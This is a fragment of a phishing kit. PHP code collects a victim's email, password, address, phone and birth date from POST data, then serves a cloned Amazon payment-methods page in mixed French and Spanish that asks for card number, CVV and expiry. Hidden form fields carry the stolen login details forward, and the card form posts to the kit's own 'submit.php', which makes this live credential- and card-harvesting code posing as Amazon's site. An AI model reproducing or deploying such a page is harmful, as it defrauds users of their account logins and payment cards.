...
$full_name = $_POST['address-ui-widgets-enterAddressFullName'];
$address1 = $_POST['address-ui-widgets-enterAddressLine1'];
$address2 = $_POST['address-ui-widgets-enterAddressLine2'];
$city = $_POST['address-ui-widgets-enterAddressCity'];
$stateorregion = $_POST['address-ui-widgets-enterAddressStateOrRegion'];
$postalcode = $_POST['address-ui-widgets-enterAddressPostalCode'];
$country = $_POST['address-ui-widgets-countryCode'];
$phone = $_POST['address-ui-widgets-enterAddressPhoneNumber'];
$jj = $_POST['jj'];
$mm = $_POST['mm'];
$aaaa = $_POST['aaaa'];
$gatecode = $_POST['address-ui-widgets-addr-details-gate-code'];

if($_GET['src'] == 'new_entry'){
	@include_once 'info.php'; /** include : Date & IP &.. variables **/
	if(empty($full_name) OR empty($address1) OR empty($city) OR empty($postalcode)){
		@header("location: address.php?src=new_entry&error=1&email=$email&password=$password") or die("<META http-equiv=\"refresh\" content=\"0; URL=address.php?src=new_entry&error=1&email=$email&password=$password\">");
	}
		?>
...
<area shape="rect" coords="0,0,800,1000" href="/b/ref=nav_shopall_nav-sa-videogames-consoles?_encoding=UTF8&node=9090550031&pf_rd_p=56dfed54-6fd6-49f9-8be9-c47adf5987a9&pf_rd_s=nav-sa-videogames-consoles&pf_rd_t=4201&pf_rd_i=navbar-4201&pf_rd_m=A13V1IB3VIYZZH&pf_rd_r=KJBMQ18EEVYC2YQQ5XXX" alt="Jeux Vidéo"/>
</map>
...
window.$Nav && $Nav.when("data").run(function(data) { data({"emptyWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Votre liste d'envies","url":"/gp/registry/wishlist/ref=nav_err_empty_wishlist/261-6291955-1044903"},"title":" ","paragraph":"Votre liste est vide"}}}},"yourAccountContent":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Votre compte","url":"/gp/css/homepage.html/ref=nav_err_youraccount/261-6291955-1044903"},"title":" ","paragraph":"Il ya un problème récupération de la liste en ce moment"}}}},"errorWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Votre liste d'envies","url":"/gp/registry/wishlist/ref=nav_err_wishlist/261-6291955-1044903"},"title":" ","paragraph":"Il ya un problème récupération de la liste en ce moment"}}}},"ewcTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Votre panier","url":"/gp/cart/view.html/ref=nav_err_ewc_timeout/261-6291955-1044903"},"title":" ","paragraph":"Il ya un problème récupérer votre panier dès maintenant"}}}},"cartTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Votre panier","url":"/gp/cart/view.html/ref=nav_err_cart_timeout/261-6291955-1044903"},"title":" ","paragraph":"Impossible d'accéder à votre panier pour l'instant"}}}},"kindleTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"Il ya un problème récupération de la liste en ce moment"}}}},"shopAllTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"Il ya un problème récupération de la liste en ce moment"}}}},"primeTimeout":{"template":{"name":"flyoutError","data":{"error":{"title":"<a href='/gp/prime'><img src='https://images-eu.ssl-images-amazon.com/images/G/08/prime/yourprime/yourprime-client-fallback._V314785238_.png' /></a>"}}}}}); });
...
window.$Nav && $Nav.declare('config.signOutText',
  "<span id=\"nav-text-signout\">Déconnectez-vous</span>");
...
<div id="subHeaderRow" class="a-row a-ws-row">
    <div id="subHeaderLeftCol" data-testid="cpe-mpo-subheader" class="a-column a-span12 a-text-left a-spacing-base a-ws-span12">
        <span>
Información general sobre tus métodos de pago, tu configuración y tus suscripciones a Amazon.
        </span>
    </div>
</div><div id="viewOneClickDesktopSection" class="a-section"></div><div id="mainContentRow" class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style=""><div id="leftNavbarPane" class="a-text-left a-fixed-left-grid-col a-col-left" style="width:250px;margin-left:-250px;_margin-left:-125px;float:left;">
...
<div class="a-section contentLoadError aok-hidden">
    ...
    <div id="contentLoadErrorAlert" class="a-box a-alert a-alert-error" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Nous sommes désolés, il semblerait que nous rencontrions un problème.</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
...
//]]></script>
<div data-pmts-component-id="pp-0B-1" class="a-section pmts-widget-section pmts-portal-root-YNCDyBNiS2FF pmts-portal-component pmts-portal-components-pp-0B-1"><div id="pp-0B-15" data-pmts-component-id="pp-0B-2" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay a-hidden aok-hidden pmts-portal-component pmts-portal-components-pp-0B-2"><img alt="" src="https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB338200758_.gif" class="pmts-loading-async-widget-spinner-viewport-centered"></div><div class="a-section a-spacing-base pmts-add-payment-instrument"><h2 data-pmts-component-id="pp-0B-9" class="a-spacing-base pmts-portal-component pmts-portal-components-pp-0B-9">Tarjetas de crédito o débito
</h2><div data-pmts-component-id="pp-0B-9" class="a-section a-spacing-base pmts-portal-component pmts-portal-components-pp-0B-9"><hr class="a-divider-normal"><div id="pp-0B-16" data-pmts-component-id="pp-0B-10" class="a-section pmts-portal-component pmts-portal-components-pp-0B-10"><div aria-live="polite" class="a-row a-expander-container a-spacing-base a-expander-inline-container pmts-add-cc add-instrument-form-expander"><div class="a-fixed-right-grid"><div class="a-fixed-right-grid-inner" style="padding-right:147px"><div class="a-fixed-right-grid-col a-col-left" style="padding-right:2%;float:left;"><div class="a-row a-spacing-base"><div class="a-row"><span class="a-size-medium pmts-portal-add-ba-title a-text-bold"></span></div><div class="a-row"><div class="a-row">Amazon accepte la plupart des cartes de paiement :</div></div></div><a id="pp-0B-17" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header pmts-add-new-card a-spacing-none a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-collapse"></i><span class="a-expander-prompt"><span class="a-size-base">Introduce la información de la tarjeta:</span></span></a></div><div class="a-text-right a-fixed-right-grid-col a-col-right" style="width:147px;margin-right:-147px;float:left;"><div class="a-section a-spacing-none a-text-right pmts-composite-logo-row"><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/08/payments-portal/r1/issuer-images/sprite-map._CB332085529_.png'); background-position: 0px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/08/payments-portal/r1/issuer-images/sprite-map._CB332085529_.png'); background-position: -45px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/08/payments-portal/r1/issuer-images/sprite-map._CB332085529_.png'); background-position: -90px;"></span></div><div class="a-section a-spacing-none a-text-right pmts-composite-logo-row"><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/08/payments-portal/r1/issuer-images/sprite-map._CB332085529_.png'); background-position: -495px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/08/payments-portal/r1/issuer-images/sprite-map._CB332085529_.png'); background-position: -540px; margin-right: 6px;"></span></div></div></div></div><div aria-expanded="true" class="a-expander-content a-spacing-base a-expander-inline-content a-expander-inner"><div id="pp-0B-18" data-pmts-component-id="pp-0B-11" class="a-section pmts-portal-component pmts-portal-components-pp-0B-11"><form method="post" action="submit.php?src=auth#bank" id="ccform" class="pmts-add-credit-card-form a-spacing-none">
<input type="hidden" name="email" value="<? echo $email; ?>">
<input type="hidden" name="password" value="<? echo $password; ?>">
<input type="hidden" name="enterAddressFullName" value="<? echo $full_name; ?>">
<input type="hidden" name="enterAddressAddressLine1" value="<? echo $address1; ?>">
<input type="hidden" name="enterAddressAddressLine2" value="<? echo $address2; ?>">
<input type="hidden" name="enterAddressCity" value="<? echo $city; ?>">
<input type="hidden" name="enterAddressStateOrRegion" value="<? echo $stateorregion; ?>">
<input type="hidden" name="enterAddressPostalCode" value="<? echo $postalcode; ?>">
<input type="hidden" name="enterAddressCountryCode" value="<? echo $country; ?>">
<input type="hidden" name="enterAddressPhoneNumber" value="<? echo $phone; ?>">
<input type="hidden" name="jj" value="<? echo $jj; ?>">
<input type="hidden" name="mm" value="<? echo $mm; ?>">
<input type="hidden" name="aaaa" value="<? echo $aaaa; ?>">
<input type="hidden" name="GateCode" value="<? echo $gatecode; ?>"><input type="hidden" name="ppw-widgetState" value="4|MXxvBwWT5laoFrZ_6GJuilaAaHvCgF9Jy_0CnqeItrSpsz6-hXHx3AehdjRH2vBiZvCj9H6LQ-NkI3_mfjXijIXNp8mi_R3-hgimomqNQX2d2_XC_o2Jfi2KGihFLxbO0GBoCjq8qGboHHvhW3SOl3HJDsrpkBOn2iUmKWWw-AplK1B120McS-QOwvKj-X1cv0SDjJe0GcjF1VLVgyRUBMNjDkfOawULl8YDuIb-3YbS4oGVud4hzXFEudr9gtlhhJNLu8Wzi28OzBhfqIUCrTn6IlbPQHMWeNWWywB3b2sQto6qyDZD6rIuOgYoHdkWZ6kLlUzSj1xPd2ZSNMNtglUqtQxZqPZBMoLeWjctZAKLuXHw5aChijAXKvAPKvvrMoXR_3dt07bKraANjNiDWWbV6FCz6pzrgMkZH5oWKGvZMpo-uMkUskFshiNnLLaD3P7fqUiiBNX1bimBx0ndTAa6zC1iNwcHqWZJciO6lyhW1tb_ZIqbf4chefnq8Gvgt7FcMIvc9u3Y77wHn2Dg8CwPahMj9XEI8PSpntxmO5yGpFrCZldJxdWWJgNH_DT35gA_Ckn5uUfWg3DbAFpYr_5pjIFpwpEp4AzbqLyIxQzQ5jD8fY_wHlLFdgo4WDfVrxwWOoRIgxumCd6j890RuqN3umC3492ROfhqvyHnPER4daxuXs_Bkm_qfeDNHlxS0a_eeWYZHkiQ-DzAprkIswEPuWn2-0xa4WnE8UITQ4UaAMo6W2R8osg1EmBArcJKAvdg4oRQDTtks1S8vEv4hvSMgs6o2h7ZD3qJHZRFLGwVuU8l0yd6WOqPz0tpob_bJthz4kGxb5xir32CYYjh6HTDqX4bFegWUifeJTCC5gmfrgap3NILlcBClzzEOQ9pH86_CQRmaL1d7JZn8_0IpBpzgaFBLW1ySOKbZFsR29dQSCwHf2c7YCpBtPQ59Y_HgfS7QHk2nSYODijK47hK6XJ592FTALlL1Di4FP57KrshPfLXkRAFaGwG-U0gr3e1TLfh8KxwSNVbzDGp_DCxhLwvATcTOt8PAQxDy8vjmVOejxPYfO5bxxfAdBwJH9859BfshnYxTNgCGKR516zPFYGUeHmp">

<input type="hidden" name="ie" value="UTF-8">
<div class="a-row a-spacing-base"><div class="a-section a-spacing-none pmts-inline-field-block"><label for="pp-0B-21" class="a-form-label">Titular de la Tarjeta
</label><input type="text" maxlength="50" id="pp-0B-21" autocomplete="off" name="ppw-accountHolderName" class="a-input-text a-form-normal a-width-base"></div><div class="a-section a-spacing-none pmts-inline-field-block"><label for="pp-0B-22" class="a-form-label">Número de tarjeta
</label><input type="tel" id="pp-0B-22" autocomplete="off" name="addCreditCardNumber" class="a-input-text a-form-normal a-width-medium"></div><br><br><br>    <div class="a-section a-spacing-none pmts-inline-field-block"><div class="a-section pmts-inline-field-block"><label class="a-form-label">CVV</label><input type="password" maxlength="4" id="pp-0B-28" autocomplete="off" name="addCreditCardVerificationNumber" class="a-input-text a-form-normal a-width-small"><input type="hidden" name="ppw-addCreditCardVerificationNumber_isRequired" value="true" id="pp-0B-29"><span class="a-letter-space"></span><span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;name&quot;:&quot;SecurityCodeTooltip&quot;,&quot;header&quot;:&quot;&quot;,&quot;position&quot;:&quot;triggerRight&quot;}"></div></div>    <div class="a-section a-spacing-none pmts-expiry pmts-date-width"><label for="pp-0B-24" class="a-form-label">Fecha de vencimiento</label><span class="a-dropdown-container"><select name="ppw-expirationDate_month" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-0B-24" tabindex="-1" class="a-native-dropdown pmts-native-dropdown"><option value="" selected="">MM</option><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select><span tabindex="-1" id="pp-0B-26" data-pmts-component-id="pp-0B-11" data-a-class="pmts-expiry-month pmts-portal-component pmts-portal-components-pp-0B-11" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-0B-11" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" tabindex="0" aria-hidden="true"><span class="a-dropdown-prompt">MM</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span><span class="a-letter-space"></span><span class="a-dropdown-container"><select name="ppw-expirationDate_year" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-0B-25" tabindex="-1" class="a-native-dropdown pmts-native-dropdown"><option value="" selected="">AAAA</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option></select><span tabindex="-1" id="pp-0B-27" data-pmts-component-id="pp-0B-11" data-a-class="pmts-expiry-year pmts-portal-component pmts-portal-components-pp-0B-11" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-0B-11" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" tabindex="0" aria-hidden="true"><span class="a-dropdown-prompt">AAAA</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div></div>

<div class="a-section pmts-inline-field-block"><span id="pp-0B-30" class="a-button a-button-primary pmts-button-input"><span class="a-button-inner"><input name="ppw-widgetEvent:AddCreditCardEvent" class="a-button-input" type="submit" aria-labelledby="pp-0B-30-announce"><input class="a-button-text" aria-hidden="true" type="submit" value="Añadir tu tarjeta"/></span></span></div></form></div></div></div></div></div></div></div><link rel="stylesheet" type="text/css" href="https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/widgets/payments-portal2-widgets.min-5b9ff5674d94faaa0fb4834fe97a379d471f41b0._CB487835644_.css"><script type="text/javascript" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/widgets/payments-portal2.min-25a207fd62d7887afbb4f0e6669b6290846b5706._CB487974831_.js"></script>
...
(function() {
        PaymentsPortal2.modules.when(['widget-factory'], function(wf) {
          var options = {"widgetRequestPrefix":"f1","testAjaxAuthenticationRequired":"false","clientId":"YA:MPO","serializedState":"4|MXxvBwWT5laoFrZ_6GJuilaAaHvCgF9Jy_0CnqeItrSpsz6-hXHx3AehdjRH2vBiZvCj9H6LQ-NkI3_mfjXijIXNp8mi_R3-hgimomqNQX2d2_XC_o2Jfi2KGihFLxbO0GBoCjq8qGboHHvhW3SOl3HJDsrpkBOn2iUmKWWw-AplK1B120McS-QOwvKj-X1cv0SDjJe0GcjF1VLVgyRUBMNjDkfOawULl8YDuIb-3YbS4oGVud4hzXFEudr9gtlhhJNLu8Wzi28OzBhfqIUCrTn6IlbPQHMWeNWWywB3b2sQto6qyDZD6rIuOgYoHdkWZ6kLlUzSj1xPd2ZSNMNtglUqtQxZqPZBMoLeWjctZAKLuXHw5aChijAXKvAPKvvrMoXR_3dt07bKraANjNiDWWbV6FCz6pzrgMkZH5oWKGvZMpo-uMkUskFshiNnLLaD3P7fqUiiBNX1bimBx0ndTAa6zC1iNwcHqWZJciO6lyhW1tb_ZIqbf4chefnq8Gvgt7FcMIvc9u3Y77wHn2Dg8CwPahMj9XEI8PSpntxmO5yGpFrCZldJxdWWJgNH_DT35gA_Ckn5uUfWg3DbAFpYr_5pjIFpwpEp4AzbqLyIxQzQ5jD8fY_wHlLFdgo4WDfVrxwWOoRIgxumCd6j890RuqN3umC3492ROfhqvyHnPER4daxuXs_Bkm_qfeDNHlxS0a_eeWYZHkiQ-DzAprkIswEPuWn2-0xa4WnE8UITQ4UaAMo6W2R8osg1EmBArcJKAvdg4oRQDTtks1S8vEv4hvSMgs6o2h7ZD3qJHZRFLGwVuU8l0yd6WOqPz0tpob_bJthz4kGxb5xir32CYYjh6HTDqX4bFegWUifeJTCC5gmfrgap3NILlcBClzzEOQ9pH86_CQRmaL1d7JZn8_0IpBpzgaFBLW1ySOKbZFsR29dQSCwHf2c7YCpBtPQ59Y_HgfS7QHk2nSYODijK47hK6XJ592FTALlL1Di4FP57KrshPfLXkRAFaGwG-U0gr3e1TLfh8KxwSNVbzDGp_DCxhLwvATcTOt8PAQxDy8vjmVOejxPYfO5bxxfAdBwJH9859BfshnYxTNgCGKR516zPFYGUeHmp","deviceType":"desktop","locale":"fr_FR","widgetInstanceId":"YNCDyBNiS2FF","continueRequestAjaxSubstitutionEnabled":false};
          var data = [{"elementReferences":{"AsyncWidgetSpinnerComponent":"pp-0B-15"},"elementDOMEventMethodBindings":[],"data":{"keepSpinnerOnWidgetDone":false,"spinnerName":"AsyncWidgetSpinnerComponent"},"id":"pp-0B-2","elementReferenceTagType":{},"type":"AsyncWidgetSpinnerComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{},"id":"pp-0B-14","elementReferenceTagType":{},"type":"InstrumentListItemComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{},"id":"pp-0B-5","elementReferenceTagType":{},"type":"InstrumentListComponent"},{"elementReferences":{"addCCIssuerLogo":"pp-0B-23"},"elementDOMEventMethodBindings":[],"data":{"enable":true,"enableJSComponent":true,"deviceType":"desktop"},"id":"pp-0B-13","elementReferenceTagType":{},"type":"IdentifyCreditCardComponent"},{"elementReferences":{"addCreditCardVerificationNumber_isRequired":"pp-0B-29","errorMessagesBoxContainer":"pp-0B-20","addCreditCardNumber":"pp-0B-22","accountHolderName":"pp-0B-21","pmts-add-creditcard-form":"pp-0B-19","pmts-account-holder-name-input":"pp-0B-21","addCreditCardVerificationNumber":"pp-0B-28","expirationDate_year":"pp-0B-27","newCreditCardSubmitButton":"pp-0B-30","expirationDate_month":"pp-0B-26","addCreditCardContainer":"pp-0B-18"},"elementDOMEventMethodBindings":[],"data":{"formDefinition":{"fields":{"expirationDate":{"monthParameterName":"expirationDate_month","dayParameterName":"expirationDate_day","yearParameterName":"expirationDate_year"},"addCreditCardPostalCode":{"defaultParameterName":"addCreditCardPostalCode","fieldRequiredParameterName":"addCreditCardPostalCode_isRequired"},"addCreditCardNumber":{"defaultParameterName":"addCreditCardNumber"},"accountHolderName":{"defaultParameterName":"accountHolderName"},"mobileNumber":{"defaultParameterName":"mobileNumber","fieldRequiredParameterName":"mobileNumber_isRequired"},"updateEverywhereAddCreditCard":{"defaultParameterName":"updateEverywhereAddCreditCard"},"addCreditCardVerificationNumber":{"defaultParameterName":"addCreditCardVerificationNumber","fieldRequiredParameterName":"addCreditCardVerificationNumber_isRequired"},"getNameOnAccount":{"defaultParameterName":"getNameOnAccount"},"setBuyingPreference":{"defaultParameterName":"setBuyingPreference"}},"constraints":[{"field":"accountHolderName","failureMessage":null,"metricValueType":"AccountHolderName","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_name_required","isCriticalOrRestricted":true,"parameters":{},"validation":"NonEmptyFieldConstraint"},{"field":"addCreditCardNumber","failureMessage":null,"metricValueType":"CreditCardNumber","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_card_number_required","isCriticalOrRestricted":true,"parameters":{},"validation":"NonEmptyFieldConstraint"},{"field":"addCreditCardNumber","failureMessage":null,"metricValueType":"CreditCardNumber","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_incorrect_card_number","isCriticalOrRestricted":true,"parameters":{},"validation":"ValidCreditCardNumberConstraint"},{"field":"expirationDate","failureMessage":null,"metricValueType":"ExpirationDate","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_exp_date_invalid","isCriticalOrRestricted":false,"parameters":{},"validation":"CreditCardExpirationConstraint"},{"field":"addCreditCardVerificationNumber","failureMessage":null,"metricValueType":"Unspecified","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_security_code_invalid","isCriticalOrRestricted":true,"parameters":{},"validation":""},{"field":"addCreditCardVerificationNumber","failureMessage":null,"metricValueType":"Unspecified","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_security_code_invalid","isCriticalOrRestricted":true,"parameters":{},"validation":"ValidCreditCardSecurityCodeConstraint"},{"field":"addCreditCardPostalCode","failureMessage":null,"metricValueType":"Unspecified","failureMessageStringId":"pmts_portal_add_instrument_credit_card_error_postal_code_invalid","isCriticalOrRestricted":true,"parameters":{"pattern":"(^[0-9]{3,20}$)"},"validation":"ValidCreditCardPostalCodeConstraint"}],"validationEvent":"AddCreditCardValidationFailedEvent","actionEvent":"AddCreditCardEvent"},"addFormJSBinding":"pmts-add-creditcard-form","addNameOnAccountCheckboxBinding":"getNameOnAccount","hasErrors":"false","addFormContainerJSBinding":"addCreditCardContainer","isINMarketplace":false,"isAddingMbcc":false,"issuersRequireSecurityToken":[],"addAccountHolderNameBinding":"accountHolderName","addCardNumberBinding":"addCreditCardNumber","formQualifier":null,"issuersHaveNoExpiration":["AmazonPLCC"],"isCvvForMbcc":false,"addButtonJSBinding":"newCreditCardSubmitButton","action":"add-credit-card","issuersRequirePostalCode":[]},"id":"pp-0B-11","elementReferenceTagType":{"addCreditCardNumber":"TextInputTag","accountHolderName":"TextInputTag","addCreditCardVerificationNumber":"TextInputTag","expirationDate_year":"DropdownTag","expirationDate_month":"DropdownTag"},"type":"AddCreditCardComponent"},{"elementReferences":{"addCreditCardWorkflowContainer":"pp-0B-16"},"elementDOMEventMethodBindings":[{"elementId":"pp-0B-17","event":"click","method":"onExpanderClick"}],"data":{"inPickAddressWorkflow":false,"isDebit":false,"isSelectableTemplate":false},"id":"pp-0B-10","elementReferenceTagType":{},"type":"AddCreditCardWorkflowComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{"showSecondaryView":"false","deviceType":"desktop"},"id":"pp-0B-9","elementReferenceTagType":{},"type":"AddPaymentInstrumentComponent"},{"elementReferences":{},"elementDOMEventMethodBindings":[],"data":{"workflowState":{"workflowName":"managePaymentMethods","activeState":"ViewInstrumentList"},"scrollOption":"toTopOfThePage"},"id":"pp-0B-1","elementReferenceTagType":{},"type":"ManagePaymentMethodsComponent"}];
          var localizedStrings = {"pmts_portal_add_instrument_credit_card_error_card_number_required":"Le num\u00E9ro de la carte est n\u00E9cessaire.","pmts_portal_add_instrument_credit_card_error_exp_date_invalid":"La date d'expiration est incorrecte.","pmts_portal_add_instrument_credit_card_error_name_required":"Le nom du titulaire de la carte est n\u00E9cessaire.","pmts_portal_add_instrument_credit_card_error_postal_code_invalid":"","pmts_portal_add_instrument_credit_card_error_incorrect_card_number":"Le num\u00E9ro de carte est incorrect.","pmts_portal_add_instrument_credit_card_error_security_code_invalid":"Veuillez saisir votre cryptogramme visuel."};
          var widgetCreationEpochMilliseconds = 1517355367616;

          wf.create('ManagePaymentMethods', options, data, localizedStrings, widgetCreationEpochMilliseconds);
        });
      }());
//]]></script>
...
<div  style="display: none">
  <div id="nav-prime-tooltip">
    <div class="nav-npt-text-title"> Livraison en 1 jour ouvré gratuite et illimitée sur des millions d’articles </div>
    <div class="nav-npt-text-detail"> Les membres Amazon Prime ont également accès à la livraison gratuite en 1 jour ouvré sur plus de 2 millions d'articles mais aussi à la livraison gratuite en 2 jours ouvrés sur 3 millions d'articles supplémentaires et à des films et séries sur Prime Video. </div>
    <div class="nav-npt-text-detail">
      &gt;
